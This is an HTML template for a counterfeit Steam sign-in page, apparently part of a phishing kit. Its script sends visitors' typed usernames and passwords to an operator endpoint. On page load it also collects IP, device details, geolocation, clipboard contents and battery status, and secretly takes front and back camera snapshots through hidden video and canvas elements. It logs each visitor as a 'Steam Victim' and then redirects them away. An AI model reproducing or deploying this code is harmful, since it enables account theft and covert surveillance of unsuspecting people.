<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Steam - Sign In</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Motiva Sans', Arial, Helvetica, sans-serif; background: #1b2838; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.container { width: 100%; max-width: 400px; padding: 20px; }
.header { text-align: center; margin-bottom: 24px; }
.steam-logo { font-size: 28px; font-weight: 700; color: #fff; display: flex; align-items: center; justify-content: center; gap: 8px; }
.steam-icon { font-size: 36px; }
.card { background: #171a21; border-radius: 4px; padding: 32px; }
h1 { font-size: 22px; color: #fff; margin-bottom: 4px; font-weight: 300; }
.subtitle { color: #8f98a0; font-size: 13px; margin-bottom: 24px; }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 11px; color: #8f98a0; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 6px; }
.form-group input { width: 100%; padding: 10px 12px; border: 1px solid #32353c; border-radius: 3px; font-size: 14px; background: #32353c; color: #c6d4df; }
.form-group input:focus { outline: none; border-color: #66c0f4; }
.remember { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; color: #8f98a0; font-size: 13px; }
.btn { width: 100%; padding: 12px; background: linear-gradient(135deg, #47bfff 0%, #1a44c2 60%); color: #fff; border: none; border-radius: 3px; font-size: 16px; cursor: pointer; }
.btn:hover { background: linear-gradient(135deg, #6cc6ff 0%, #2e5fd4 60%); }
.links { margin-top: 20px; text-align: center; }
.links a { color: #66c0f4; font-size: 12px; text-decoration: none; display: block; margin: 8px 0; }
.links a:hover { color: #fff; }
.loading { display: none; text-align: center; padding: 30px; }
.spinner { border: 3px solid #32353c; border-top: 3px solid #66c0f4; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="steam-logo"><span class="steam-icon">⚙️</span>STEAM</div>
</div>
<div class="card">
<h1>Sign in</h1>
<p class="subtitle">Sign in with your Steam account</p>
<form id="loginForm">
<div class="form-group">
<label>Steam Account Name</label>
<input type="text" id="username" required>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" id="password" required>
</div>
<div class="remember">
<input type="checkbox" id="rem"><label for="rem" style="cursor:pointer">Remember me</label>
</div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#8f98a0;font-size:14px;">Signing in...</p>
</div>
<div class="links">
<a href="#">Help, I can't sign in</a>
<a href="#">Create a free account</a>
</div>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

async function gatherAll() {
    let td = '🎮 <b>Steam Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}
    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'Steam' });
    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>